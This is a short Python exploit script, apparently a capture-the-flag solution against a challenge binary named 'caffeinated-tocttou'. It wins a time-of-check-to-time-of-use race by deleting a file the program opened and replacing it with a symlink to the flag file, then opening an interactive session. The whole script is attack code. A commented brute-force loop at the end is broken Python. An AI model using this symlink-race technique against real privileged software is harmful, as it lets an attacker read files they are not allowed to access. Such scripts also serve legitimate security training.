#!/usr/bin/env python

from pwn import *
import os

#rm output
#mkfifo output

#r = process("./read")

p = process("./caffeinated-tocttou")

sleep(1)

print(p.recv())

p.sendline("output")

fd = open("output", "w");


#p.sendline("output")


sleep(1)
os.unlink("output")


src = "output"
dst = "flag"

os.symlink(dst, src)

fd.close()

#r.close()
#r.kill()
#sleep(10)

print(p.recv(timeout=10))
#print(p.recv(timeout=0.2))

p.interactive()




'''
brute force
while True:
    with open ("a","w");
    os.unlink("a")
    os.symlink(flag)






mkfifo output



'''
